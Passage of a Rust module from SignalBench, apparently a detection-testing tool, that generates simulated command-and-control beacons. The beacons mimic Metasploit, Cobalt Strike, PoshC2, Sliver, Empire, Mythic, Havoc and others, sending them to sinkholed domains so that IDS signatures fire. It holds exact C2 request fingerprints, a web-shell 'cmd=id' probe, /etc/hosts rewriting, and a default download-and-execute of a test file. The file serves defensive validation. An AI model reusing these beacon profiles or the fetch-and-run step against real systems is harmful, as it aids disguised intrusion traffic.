// SPDX-FileCopyrightText: GoCortexIO
// SPDX-License-Identifier: AGPL-3.0-or-later

// SIGNALBENCH - Endpoint Telemetry Generator
// Command and Control technique telemetry patterns
//
// This module contains command and control techniques according to MITRE ATT&CK framework
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{
    AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter,
};
use async_trait::async_trait;
use base64::{
    engine::general_purpose::{STANDARD as B64, URL_SAFE as B64URL},
    Engine as _,
};
use log::{debug, error, info, warn};
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use std::process::Stdio;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpStream, UdpSocket};
use tokio::process::Command;
use tokio::time::{sleep, timeout as async_timeout, Duration};
use uuid::Uuid;

// T1071-IOC hosts file markers for safe testing of unowned domains
const HOSTS_MARKER_START: &str = "# SIGNALBENCH-T1071-IOC-START";
const HOSTS_MARKER_END: &str = "# SIGNALBENCH-T1071-IOC-END";
const HOSTS_FILE_PATH: &str = "/etc/hosts";
const SAFE_TEST_IP_FALLBACK: &str = "198.135.184.22";
const SINKHOLE_LOOKUP_DOMAIN: &str = "sinkhole.signalbench.sigre.xyz";
const HOSTS_ARTIFACT_MARKER: &str = "/tmp/.signalbench_t1071_hosts_modified";

// Stratum protocol simulation constants
const STRATUM_MINING_DOMAINS: &[&str] = &[
    "pool.signalbench-mining.com",
    "stratum.signalbench-crypto.net",
];
const STRATUM_PORTS: &[u16] = &[3333, 4444];
const STRATUM_SUBSCRIBE: &str =
    "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"signalbench/1.8.7\", null]}\n";
const STRATUM_AUTHORIZE: &str =
    "{\"id\": 2, \"method\": \"mining.authorize\", \"params\": [\"signalbench.worker1\", \"x\"]}\n";
const STRATUM_PING: &str = "{\"id\": 9, \"method\": \"mining.ping\", \"params\": []}\n";
const STRATUM_CLIENT_VERSION_RESPONSE: &str =
    "{\"id\": 4, \"result\": \"signalbench/1.8.7\", \"error\": null}\n";

// Unowned domains that require /etc/hosts configuration for safe testing
const UNOWNED_DOMAINS: &[&str] = &[
    "signalbench-c2-test.tk",
    "signalbench-malware.ru",
    "signalbench-backdoor.cn",
    "signalbench-rat.xyz",
    "signalbench-payload.top",
    "update.signalbench-services.com",
    "cdn.signalbench-delivery.net",
    "api.signalbench-auth.io",
    "signalbench.onion.link",
    "pool.signalbench-mining.com",
    "stratum.signalbench-crypto.net",
    "signalbench-mythic.pw",
    "signalbench-havoc.cc",
    "signalbench-empire.net",
];

/// Domains that receive a per-domain C2 framework HTTP beacon profile.
/// Each profile encodes the distinctive request fingerprints documented by
/// Unit 42, Nettitude, Didier Stevens, and Microsoft MSRC so that both the
/// request headers (client-side) and the response headers (from the Python
/// responder) generate the correct IDS detection signatures on the PA-440.
const C2_PROFILED_DOMAINS: &[&str] = &[
    "signalbench-c2-test.tk",
    "signalbench-malware.ru",
    "signalbench-backdoor.cn",
    "signalbench-rat.xyz",
    "signalbench-payload.top",
    "update.signalbench-services.com",
    "api.signalbench-auth.io",
    "cdn.signalbench-delivery.net",
    "signalbench-mythic.pw",
    "signalbench-havoc.cc",
    "signalbench-empire.net",
];

// PoshC2 10-variant binary bodies.
// Exact 40-byte payloads from the task specification (snort3-malware-cnc.rules
// MALWARE-CNC Win.Trojan.PoshC2 inbound connection reference set).
// The first 16 bytes are base64url-encoded to form the SessionID= cookie value.
// Bytes 16-39 carry the simulated encrypted command blob.
// snort3-malware-cnc.rules: content:"SessionID=",http_cookie;
//   content:"POST",http_method; content:"/news.php",http_uri
const POSHC2_VARIANTS: [[u8; 40]; 10] = [
    [0xC0,0x6D,0x19,0xA6,0x32,0xFB,0xFF,0xFD,0x03,0x9C,0x20,0x06,0x9E,0x23,0x68,0xC3,
     0x79,0xE3,0xF5,0xE6,0x65,0xC2,0x75,0x14,0xA3,0x2F,0x0B,0xA0,0x26,0x31,0xB1,0x4A,
     0xCC,0xED,0xD3,0x36,0xB2,0x4F,0xD8,0xEF],
    [0xA7,0x31,0x1B,0xB2,0x01,0x87,0x6F,0xDE,0x98,0x46,0xB6,0x91,0xB5,0xF7,0xE0,0x94,
     0x19,0xA2,0x13,0xDF,0x36,0xCB,0x5F,0x21,0x44,0x71,0x64,0x15,0x7F,0x92,0x18,0xE1,
     0xAB,0x03,0x83,0x20,0xCF,0x6C,0xCC,0x07],
    [0xAD,0x54,0x33,0x00,0xD8,0x97,0xFC,0xD6,0x04,0x1B,0x4E,0x34,0x79,0x0D,0x0F,0x68,
     0x4F,0x3D,0xBF,0x67,0x18,0x90,0xFB,0x32,0x7A,0xE4,0xEB,0x3A,0x6E,0x98,0x99,0xE7,
     0xC7,0xF9,0x42,0x40,0x9F,0x4A,0xD4,0x3F],
    [0xCE,0x5E,0xB2,0xB8,0x0C,0x20,0x4E,0x9B,0xAE,0xFD,0x50,0xD4,0xB9,0xE0,0x12,0xF6,
     0x81,0xBE,0x27,0x08,0xC9,0x16,0x19,0x73,0x3A,0xE2,0x9C,0x41,0x9D,0x59,0x2C,0x88,
     0x62,0x26,0xE6,0xEA,0x11,0xAB,0xCD,0x67],
    [0x3D,0x44,0x21,0x31,0x23,0xCC,0x9E,0x6E,0xA6,0x24,0x2F,0xDE,0x04,0x47,0x10,0xCA,
     0x1C,0x52,0xBA,0x05,0x69,0x7D,0x8C,0xD9,0x29,0x2D,0xC2,0x95,0x35,0xD2,0x9B,0xB8,
     0x60,0x34,0x66,0x46,0x71,0x83,0x48,0xB7],
    [0x28,0x7A,0x82,0xA9,0x51,0xA0,0x04,0xC2,0x03,0x48,0x39,0x0F,0xA3,0x9F,0x6B,0x98,
     0x01,0xD2,0x0C,0xA1,0xA2,0x35,0xDA,0x8C,0xB8,0xAC,0x61,0xF4,0x73,0x2C,0xF7,0x3E,
     0x54,0xF0,0xDB,0x71,0xEA,0x4B,0x66,0x49],
    [0xD1,0xF7,0x94,0x77,0xAD,0xC6,0x92,0xA2,0x7A,0x9A,0xE2,0x9D,0x2F,0x02,0x36,0xB1,
     0x13,0x66,0x0F,0x30,0xD0,0x06,0x88,0xD7,0xEA,0x73,0x92,0x05,0x58,0xDB,0xB2,0x4C,
     0xB6,0x54,0x35,0x40,0x25,0x49,0xCF,0x78],
    [0x10,0x62,0x34,0xC1,0x6D,0xCD,0x43,0xB8,0xF0,0x22,0x3C,0xE9,0x60,0xB7,0x47,0x27,
     0x81,0x83,0x5A,0xC6,0x0D,0xBD,0xD4,0x14,0x09,0x8B,0xE3,0x9D,0x0E,0x35,0x0C,0x6A,
     0xEB,0xE7,0x6C,0xBC,0x0F,0x97,0xF2,0x74],
    [0x9B,0xCD,0x32,0x65,0x3D,0x73,0x9E,0xC8,0x75,0x76,0x00,0x48,0xA0,0xB0,0xF6,0xEB,
     0x67,0x40,0x14,0xA1,0x49,0x92,0xFE,0xD0,0x6E,0x71,0x5B,0xA6,0xD9,0xD6,0x9F,0x01,
     0x30,0xAB,0x0B,0x4A,0x94,0xDA,0x7C,0x07],
    [0x5A,0x75,0x05,0x8E,0x46,0xA4,0x8F,0x7A,0xD2,0xB0,0x11,0x93,0x47,0x00,0x7E,0xB4,
     0x40,0xFF,0x0B,0x99,0x74,0x0E,0x09,0xA0,0x2A,0x69,0x87,0x3D,0x91,0x33,0x61,0x9A,
     0xF0,0x3C,0x9B,0x54,0x8D,0x44,0x04,0xD0],
];

// JPEG JFIF APP0 header (20 bytes) — real PoshC2 getimgdata() output prefix.
// Prepended to each 40-byte variant to produce a 1500-byte body matching
// the real implant's wire format.
const POSHC2_JPEG_SOI: &[u8] =
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00";

fn poshc2_body(variant: &[u8]) -> Vec<u8> {
    const TARGET: usize = 1500;
    let mut body = Vec::with_capacity(TARGET);
    body.extend_from_slice(POSHC2_JPEG_SOI);
    body.extend_from_slice(variant);
    body.extend((0..TARGET - body.len()).map(|_| rand::random::<u8>()));
    body
}

/// HTTP C2 framework beacon profile.
/// Encodes the distinctive headers used by a specific post-exploitation
/// framework so each domain in T1071-IOC generates the correct signatures.
/// Dynamic fields (session tokens, cookie values) use String/Vec<u8> so they
/// can be generated fresh at runtime.  Body fields use Vec<u8> so binary
/// payloads (e.g. AdaptixC2 RC4 blob, dnscat2 packet bytes) survive execve.
struct HttpC2Profile {
    domain: &'static str,
    reason: &'static str,
    framework: &'static str,
    method: &'static str,
    uri: String,
    user_agent: &'static str,
    extra_headers: Vec<String>,
    body: Option<Vec<u8>>,
    followup_method: Option<&'static str>,
    followup_uri: Option<String>,
    followup_extra_headers: Vec<String>,
    followup_body: Option<Vec<u8>>,
}

/// Builds per-domain C2 framework beacon profiles.  Session tokens, cookie
/// values, and request IDs are generated fresh on each call so every run
/// carries distinct header values for the same framework fingerprint.
fn c2_profiles() -> Vec<HttpC2Profile> {
    let dnscat_session = Uuid::new_v4().to_string();

    // AdaptixC2 BEACON body shape per Unit 42:
    //   [4-byte LE size][N-byte RC4 ciphertext][16-byte RC4 key]
    // We don't share the listener's RC4 key so the ciphertext bytes are
    // random -- indistinguishable from real RC4 output to passive observers.
    let adaptix_body: Vec<u8> = {
        use rand::Rng;
        let mut rng = rand::rng();
        let payload_len: u32 = 96;
        let mut v = Vec::with_capacity(4 + payload_len as usize + 16);
        v.extend_from_slice(&payload_len.to_le_bytes());
        for _ in 0..payload_len {
            v.push(rng.random::<u8>());
        }
        for _ in 0..16 {
            v.push(rng.random::<u8>());
        }
        v
    };
    let adaptix_beacon_id =
        Uuid::new_v4().to_string().replace('-', "")[..16].to_string();
    let adaptix_app_id =
        Uuid::new_v4().to_string().replace('-', "")[..16].to_string();

    // Empire RoutingPacket (Empire 5 wire format):
    //   [12-byte nonce][32-byte ChaCha20-Poly1305 ciphertext+tag][N-byte encData]
    // Random staging key means the 32-byte authenticated block is
    // indistinguishable from real C20P output to a passive observer.
    let empire_routing_cookie: String = {
        use rand::Rng;
        let mut rng = rand::rng();
        let mut packet = Vec::with_capacity(12 + 32);
        for _ in 0..12 {
            packet.push(rng.random::<u8>());
        }
        for _ in 0..32 {
            packet.push(rng.random::<u8>());
        }
        B64.encode(&packet)
    };

    // Mythic beacon URI: base64(uuid_str + json_payload).
    // The literal "JhY3Rpb24iOi" is the Mythic HTTP C2 profile parameter name.
    // snort3-malware-cnc.rules sid MALWARE-CNC Multi.Trojan.Mythic outbound connection:
    //   http_uri; content:"JhY3Rpb24iOi"; base64_decode:relative; isdataat:85;
    //   byte_test:1,=,0x2D,8; byte_test:1,=,0x7B,36 (checks UUID dashes + opening brace)
    let mythic_uuid = Uuid::new_v4().to_string(); // 36 chars with dashes
    let mythic_json = "{\"action\":\"get_tasking\",\"tasking_size\":-1,\"delegates\":[]}";
    let mythic_payload = format!("{}{}", mythic_uuid, mythic_json); // 87 bytes decoded
    let mythic_b64 = B64.encode(mythic_payload.as_bytes());
    // Mythic session token: 32-char hex with no dashes (aC2token cookie)
    let mythic_token = Uuid::new_v4().to_string().replace('-', "");

    vec![
        // signalbench-c2-test.tk: Metasploit / Meterpreter reverse_http
        // MSIE 6.1/NT UA documented by Didier Stevens from Metasploit source.
        // POST /aFzBt with body "RECV" is the stage-0 meterpreter check-in.
        // Server responds: Apache/2.2.15 (CentOS) -- default MSF listener.
        HttpC2Profile {
            domain: "signalbench-c2-test.tk",
            reason: "Metasploit C2 domain pattern",
            framework: "Metasploit/Meterpreter",
            method: "POST",
            uri: "/aFzBt".to_string(),
            user_agent: "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)",
            extra_headers: vec!["Cookie: TotallySafeC2=AAAAAAAAAAAAAAAA".to_string()],
            body: Some(b"RECV".to_vec()),
            followup_method: Some("GET"),
            followup_uri: Some("/dEpOq".to_string()),
            followup_extra_headers: vec![],
            followup_body: None,
        },
        // signalbench-malware.ru: Cobalt Strike multi-pattern sequence.
        // Stub entry; the execute loop dispatches to a dedicated 7-request
        // handler when it finds this domain.  Only framework/reason/user_agent
        // are used by the special-case handler.
        // snort3-malware-cnc.rules sids: 63772, 65446, 300048, 54175, 54182, 56616
        // snort3-indicator-compromise.rules sid: 300048
        HttpC2Profile {
            domain: "signalbench-malware.ru",
            reason: "Cobalt Strike C2 domain pattern",
            framework: "Cobalt Strike",
            method: "GET",
            uri: "/get".to_string(),
            user_agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; BOIE9;ENGB)",
            extra_headers: vec![],
            body: None,
            followup_method: None,
            followup_uri: None,
            followup_extra_headers: vec![],
            followup_body: None,
        },
        // signalbench-backdoor.cn: PoshC2 10-variant binary POST sequence.
        // Stub entry; the execute loop dispatches to the POSHC2_VARIANTS loop
        // when it finds this domain.  Only framework/reason/user_agent/domain
        // are used by the special-case handler.
        // snort3-malware-cnc.rules: MALWARE-CNC Win.Trojan.PoshC2 inbound connection
        // (content:"SessionID=",http_cookie; content:"POST"; content:"/news.php",http_uri)
        HttpC2Profile {
            domain: "signalbench-backdoor.cn",
            reason: "PoshC2 C2 domain pattern",
            framework: "PoshC2",
            method: "POST",
            uri: "/news.php".to_string(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
            extra_headers: vec![],
            body: None,
            followup_method: None,
            followup_uri: None,
            followup_extra_headers: vec![],
            followup_body: None,
        },
        // signalbench-rat.xyz: Sliver HTTP C2 — 8-request session sequence.
        // Stub entry; the execute loop dispatches to a dedicated 8-request
        // handler when it finds this domain.  Only framework/reason/user_agent
        // are used by the special-case handler.
        // snort3-malware-cnc.rules: MALWARE-CNC Win.Backdoor.Sliver connect attempt
        // (http_header:field user-agent; content:"Trident/7.0"; content:"like Gecko";
        //  http_cookie; content:"PHPSESSID="; http_uri; content:"?_=")
        // NOTE: the "like Gecko" suffix is required -- rules match on both tokens.
        HttpC2Profile {
            domain: "signalbench-rat.xyz",
            reason: "Sliver HTTP C2 domain pattern",
            framework: "Sliver",
            method: "GET",
            uri: "/robots.txt".to_string(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            extra_headers: vec![],
            body: None,
            followup_method: None,
            followup_uri: None,
            followup_extra_headers: vec![],
            followup_body: None,
        },
        // signalbench-payload.top: AdaptixC2 BEACON HTTP C2 (replaces Merlin).
        // Per Unit 42 (unit42.paloaltonetworks.com/adaptixc2-post-exploitation-
        // framework), AdaptixC2 BEACON agents POST to /uri.php (default) or
        // /endpoint/api (observed) with an X-Beacon-Id (or X-App-Id) custom
        // header and a body shaped as
        //   [4-byte LE size][N-byte RC4 ciphertext][16-byte RC4 key]
        // Confirmed firing on PA-440 as "AdaptixC2 Command and Control
        // Traffic Detection" (Critical).
        // Default UA = Firefox 20 on Windows 8 (NT 6.2) -- a distinctive
        // 2013-era UA that anchors the PAN signature.
        HttpC2Profile {
            domain: "signalbench-payload.top",
            reason: "AdaptixC2 BEACON C2 domain pattern",
            framework: "AdaptixC2",
            method: "POST",
            uri: "/uri.php".to_string(),
            user_agent: "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0",
            extra_headers: vec![
                "Content-Type: application/octet-stream".to_string(),
                format!("X-Beacon-Id: {}", adaptix_beacon_id),
            ],
            body: Some(adaptix_body.clone()),
            followup_method: Some("POST"),
            followup_uri: Some("/endpoint/api".to_string()),
            followup_extra_headers: vec![
                "Content-Type: application/octet-stream".to_string(),
                format!("X-App-Id: {}", adaptix_app_id),
            ],
            followup_body: Some(adaptix_body),
        },
        // signalbench-empire.net: PowerShell Empire HTTP listener.
        // Defaults from BC-SECURITY/Empire empire/server/listeners/http.py:
        //   URIs        = /admin/get.php, /news.php, /login/process.php
        //   User-Agent  = IE11 Trident/7.0 like Gecko
        //   Cookie name = "session"
        //   Listener    = Server: Microsoft-IIS/7.5
        // Session cookie value is base64(RoutingPacket) where RoutingPacket
        // is 12-byte nonce + 32-byte ChaCha20-Poly1305 ciphertext+tag (see
        // empire/server/common/packets.py).  Per Unit 42, PAN threat IDs
        // 86715, 86720, 86729, 86732, 86733 cover Empire HTTP C2 -- though
        // these sigs may require HTTPS layer presence and Go/C# JA3 to fire.
        HttpC2Profile {
            domain: "signalbench-empire.net",
            reason: "PowerShell Empire C2 domain pattern",
            framework: "PowerShell Empire",
            method: "GET",
            uri: "/admin/get.php".to_string(),
            user_agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            extra_headers: vec![
                format!("Cookie: session={}", empire_routing_cookie),
            ],
            body: None,
            followup_method: Some("POST"),
            followup_uri: Some("/login/process.php".to_string()),
            followup_extra_headers: vec![
                format!("Cookie: session={}", empire_routing_cookie),
            ],
            followup_body: Some(vec![]),
        },
        // update.signalbench-services.com: nasbench BabyShark C2 framework
        // (GitHub: UnkL4b/BabyShark). Python/Flask server; bash agent via
        // Google Translate proxy.
        // Check-in: GET /momyshark?key=b4bysh4rk with Chrome/70 UA.
        // Result exfil: same URI but UA becomes "<base_ua> | <b64_output> | <id>".
        // base64("/home/user\n") = "L2hvbWUvdXNlcgo=" (simulated pwd output).
        // No PA-440 Snort content rule -- detection is indicator-based only
        // (URI /momyshark, key param, pipe-delimited UA for exfil).
        HttpC2Profile {
            domain: "update.signalbench-services.com",
            reason: "BabyShark C2 domain pattern (nasbench framework)",
            framework: "BabyShark",
            method: "GET",
            uri: "/momyshark?key=b4bysh4rk".to_string(),
            user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
            extra_headers: vec![],
            body: None,
            followup_method: Some("GET"),
            followup_uri: Some("/momyshark?key=b4bysh4rk".to_string()),
            followup_extra_headers: vec![
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 | L2hvbWUvdXNlcgo= | 1".to_string(),
            ],
            followup_body: None,
        },
        // api.signalbench-auth.io: dnscat2 HTTP tunnel / SK8PARK
        // Go-http-client/1.1 UA + opaque binary POST is the primary dnscat2-over-HTTP IOC.
        // Body: 16 bytes of 0x01 (packet 0); follow-up: 16 bytes of 0x02 (packet 1).
        HttpC2Profile {
            domain: "api.signalbench-auth.io",
            reason: "dnscat2 HTTP tunnel domain pattern",
            framework: "dnscat2",
            method: "POST",
            uri: "/api/auth/validate".to_string(),
            user_agent: "Go-http-client/1.1",
            extra_headers: vec![
                "Content-Type: application/octet-stream".to_string(),
                format!("X-Session-ID: {}", dnscat_session),
                "X-Packet-Index: 0".to_string(),
            ],
            body: Some(vec![0x01u8; 16]),
            followup_method: Some("POST"),
            followup_uri: Some("/api/auth/validate".to_string()),
            followup_extra_headers: vec![
                "Content-Type: application/octet-stream".to_string(),
                format!("X-Session-ID: {}", dnscat_session),
                "X-Packet-Index: 1".to_string(),
            ],
            followup_body: Some(vec![0x02u8; 16]),
        },
        // cdn.signalbench-delivery.net: web shell probe
        // Four sequential requests (China Chopper, SUPERNOVA, generic PHP/CGI) to
        // trigger web shell detection rules (Unit 42 web shell research).
        // The loop runs a dedicated 4-request sequence when it finds this profile;
        // only framework/reason/user_agent/domain are used from the struct.
        HttpC2Profile {
            domain: "cdn.signalbench-delivery.net",
            reason: "CDN masquerading / web shell probe",
            framework: "Web shell probe",
            method: "GET",
            uri: "/uploads/files/shell.php?cmd=id".to_string(),
            user_agent: "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            extra_headers: vec![],
            body: None,
            followup_method: None,
            followup_uri: None,
            followup_extra_headers: vec![],
            followup_body: None,
        },
        // signalbench-mythic.pw: Mythic C2 Apollo/HTTP agent check-in.
        // URI contains "JhY3Rpb24iOi" — the Mythic HTTP C2 profile action parameter name.
        // Value is base64(uuid_str + json_body); decoded bytes at offset 8 = 0x2D (dash
        // from UUID), offset 36 = 0x7B (opening brace of the JSON blob), isdataat:85 passes.
        // snort3-malware-cnc.rules: MALWARE-CNC Multi.Trojan.Mythic outbound connection
        HttpC2Profile {
            domain: "signalbench-mythic.pw",
            reason: "Mythic C2 domain pattern",
            framework: "Mythic",
            method: "GET",
            uri: format!("/api/v1/agent?JhY3Rpb24iOi={}", mythic_b64),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            extra_headers: vec![
                format!("Cookie: aC2token={}", mythic_token),
            ],
            body: None,
            followup_method: None,
            followup_uri: None,
            followup_extra_headers: vec![],
            followup_body: None,
        },
        // signalbench-havoc.cc: Havoc C2 — 3-request sequence.
        // Stub entry; the execute loop dispatches to a dedicated handler.
        // Only framework/reason/user_agent/domain are used.
        // Request 1 (GET jquery): triggers Havoc jquery-masquerading rule (Server: Apache req).
        // Request 2 (POST DEADBEEF): snort3-malware-cnc.rules Havoc teamserver magic bytes.
        // Request 3 (POST B16B00B5): snort3-malware-cnc.rules Havoc variant magic bytes.
        HttpC2Profile {
            domain: "signalbench-havoc.cc",
            reason: "Havoc C2 domain pattern",
            framework: "Havoc",
            method: "GET",
            uri: "/js/jquery-3.6.4.min.js".to_string(),
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            extra_headers: vec![],
            body: None,
            followup_method: None,
            followup_uri: None,
            followup_extra_headers: vec![],
            followup_body: None,
        },
    ]
}

/// Checks if the current process is running as root
fn is_running_as_root() -> bool {
    unsafe { libc::geteuid() == 0 }
}

/// Checks if a domain is considered safe (owned by GoCortex or TEST-NET IP)
fn is_safe_domain(domain: &str) -> bool {
    // Owned domains: *.sigre.xyz
    if domain.ends_with(".sigre.xyz") {
        return true;
    }

    // TEST-NET IP ranges (RFC 5737)
    if domain.starts_with("192.0.2.")
        || domain.starts_with("198.51.100.")
        || domain.starts_with("203.0.113.")
    {
        return true;
    }

    false
}

/// Checks if a domain resolves to sinkhole_ip using the system resolver
/// (getent hosts).  Honouring /etc/hosts means the block written by
/// add_hosts_entries is the primary mechanism; this confirms it took effect.
async fn domain_resolves_to_safe_ip(domain: &str, sinkhole_ip: &str) -> bool {
    let output = Command::new("getent")
        .args(["hosts", domain])
        .output()
        .await;

    match output {
        Ok(result) => {
            let stdout = String::from_utf8_lossy(&result.stdout);
            stdout.contains(sinkhole_ip)
        }
        Err(_) => false,
    }
}

/// Resolves the active sinkhole IP via the system resolver — no external
/// binary required.  Uses tokio::net::lookup_host which honours /etc/hosts
/// and /etc/resolv.conf identically to getaddrinfo(3).  Falls back to
/// SAFE_TEST_IP_FALLBACK on any error so existing behaviour is fully
/// preserved when DNS is unavailable or the record has not yet been created.
/// Using the system resolver means operators can intercept this lookup via
/// /etc/hosts or a local DNS resolver to redirect the sinkhole for their
/// own environment.
async fn resolve_sinkhole_ip() -> String {
    use tokio::net::lookup_host;
    // Append a port so lookup_host accepts the argument; the port is discarded.
    match lookup_host(format!("{}:80", SINKHOLE_LOOKUP_DOMAIN)).await {
        Ok(mut addrs) => {
            if let Some(addr) = addrs.find(|a| a.is_ipv4()) {
                let ip = addr.ip().to_string();
                if ip != SAFE_TEST_IP_FALLBACK {
                    info!(
                        "[T1071-IOC] Sinkhole resolved: {} -> {}",
                        SINKHOLE_LOOKUP_DOMAIN, ip
                    );
                }
                return ip;
            }
            warn!(
                "[T1071-IOC] Sinkhole lookup returned no IPv4 address - using fallback {}",
                SAFE_TEST_IP_FALLBACK
            );
            SAFE_TEST_IP_FALLBACK.to_string()
        }
        Err(e) => {
            warn!(
                "[T1071-IOC] Sinkhole lookup failed ({}) - using fallback {}",
                e, SAFE_TEST_IP_FALLBACK
            );
            SAFE_TEST_IP_FALLBACK.to_string()
        }
    }
}

/// Adds unowned domains to /etc/hosts pointing to sinkhole_ip.
/// Returns Ok(true) if entries were added, Ok(false) if already present.
fn add_hosts_entries(sinkhole_ip: &str) -> Result<bool, String> {
    let hosts_path = Path::new(HOSTS_FILE_PATH);

    // Read existing hosts file
    let existing_content = fs::read_to_string(hosts_path)
        .map_err(|e| format!("Failed to read {}: {}", HOSTS_FILE_PATH, e))?;

    // Check if our marker block already exists
    if existing_content.contains(HOSTS_MARKER_START) {
        debug!("[T1071-IOC] Hosts entries already present, skipping addition");
        return Ok(false);
    }

    // Build the new block
    let mut block = String::new();
    block.push_str(HOSTS_MARKER_START);
    block.push('\n');
    for domain in UNOWNED_DOMAINS {
        block.push_str(&format!("{}    {}\n", sinkhole_ip, domain));
    }
    block.push_str(HOSTS_MARKER_END);
    block.push('\n');

    // Append to hosts file
    let new_content = format!("{}\n{}", existing_content.trim_end(), block);

    // Atomic write: write to temp file in SAME directory, then rename
    // Using unique temp filename with process ID
    let temp_path = format!("/etc/.hosts.signalbench.{}", std::process::id());
    fs::write(&temp_path, &new_content)
        .map_err(|e| format!("Failed to write temporary hosts file: {}", e))?;

    // Atomic rename within same filesystem
    if let Err(e) = fs::rename(&temp_path, hosts_path) {
        // Clean up temp file on failure
        let _ = fs::remove_file(&temp_path);
        return Err(format!("Failed to atomic rename to {}: {}", HOSTS_FILE_PATH, e));
    }

    // Create marker file to track that we modified hosts
    let _ = fs::write(HOSTS_ARTIFACT_MARKER, "modified");

    info!("[T1071-IOC] Added {} domain entries to {}", UNOWNED_DOMAINS.len(), HOSTS_FILE_PATH);
    Ok(true)
}

/// Removes the SignalBench marker block from /etc/hosts
fn remove_hosts_entries() -> Result<(), String> {
    let hosts_path = Path::new(HOSTS_FILE_PATH);

    // Check if marker file exists (indicates we modified hosts)
    if !Path::new(HOSTS_ARTIFACT_MARKER).exists() {
        debug!("[T1071-IOC] No hosts modification marker found, skipping cleanup");
        return Ok(());
    }

    // Read existing hosts file
    let content = fs::read_to_string(hosts_path)
        .map_err(|e| format!("Failed to read {}: {}", HOSTS_FILE_PATH, e))?;

    // Verify marker block integrity: both START and END markers must be present
    let has_start = content.contains(HOSTS_MARKER_START);
    let has_end = content.contains(HOSTS_MARKER_END);

    if !has_start && !has_end {
        // No markers at all, just remove the artifact marker
        let _ = fs::remove_file(HOSTS_ARTIFACT_MARKER);
        debug!("[T1071-IOC] No marker block found in hosts file, nothing to clean");
        return Ok(());
    }

    if has_start != has_end {
        // Malformed marker block - one marker missing, abort to prevent corruption
        warn!(
            "[T1071-IOC] Malformed marker block in {}: START={}, END={}. Manual cleanup required.",
            HOSTS_FILE_PATH, has_start, has_end
        );
        let _ = fs::remove_file(HOSTS_ARTIFACT_MARKER);
        return Err(format!(
            "Malformed marker block in {} - manual cleanup required",
            HOSTS_FILE_PATH
        ));
    }

    // Both markers present, safe to proceed
    let mut new_lines: Vec<&str> = Vec::new();
    let mut in_marker_block = false;

    for line in content.lines() {
        if line.trim() == HOSTS_MARKER_START {
            in_marker_block = true;
            continue;
        }

        if line.trim() == HOSTS_MARKER_END {
            in_marker_block = false;
            continue;
        }

        if !in_marker_block {
            new_lines.push(line);
        }
    }

    // Atomic write: write to temp file in SAME directory, then rename
    let temp_path = format!("/etc/.hosts.signalbench.cleanup.{}", std::process::id());
    let new_content = new_lines.join("\n");
    fs::write(&temp_path, format!("{}\n", new_content.trim_end()))
        .map_err(|e| format!("Failed to write temporary hosts file: {}", e))?;

    // Atomic rename within same filesystem
    if let Err(e) = fs::rename(&temp_path, hosts_path) {
        // Clean up temp file on failure
        let _ = fs::remove_file(&temp_path);
        return Err(format!("Failed to atomic rename to {}: {}", HOSTS_FILE_PATH, e));
    }

    // Remove marker file
    let _ = fs::remove_file(HOSTS_ARTIFACT_MARKER);

    info!("[T1071-IOC] Removed SignalBench entries from {}", HOSTS_FILE_PATH);
    Ok(())
}

/// Prints warning message for skipped domains when not running as root
fn print_skipped_domains_warning(skipped: &[&str], sinkhole_ip: &str) {
    if skipped.is_empty() {
        return;
    }

    println!();
    warn!("[WARN] The following domains are not owned by GoCortex and have not been");
    warn!("[WARN] configured in /etc/hosts. HTTP tests skipped to prevent IP exposure.");
    warn!("[WARN]");
    warn!("[WARN] To enable testing, add the following to /etc/hosts (requires root):");

    for domain in skipped {
        warn!("[WARN] {}    {}", sinkhole_ip, domain);
    }

    println!();
}

// ======================================
// T1105 - Ingress Tool Transfer
// ======================================
pub struct IngressToolTransfer {}

#[async_trait]
impl AttackTechnique for IngressToolTransfer {
    fn info(&self) -> Technique {
        Technique {
            id: "T1105".to_string(),
            name: "Ingress Tool Transfer".to_string(),
            description: "Generates telemetry for ingress tool transfer activities".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "url".to_string(),
                    description: "URL of the file to download".to_string(),
                    required: false,
                    default: Some(
                        "https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string(),
                    ),
                },
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "Path to save the downloaded file".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_tool_transfer".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save download and execution log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_ingress_transfer.log".to_string()),
                },
                TechniqueParameter {
                    name: "execute".to_string(),
                    description: "Whether to attempt execution of downloaded file".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection:
                "Network monitoring can detect malicious file downloads and execution attempts"
                    .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
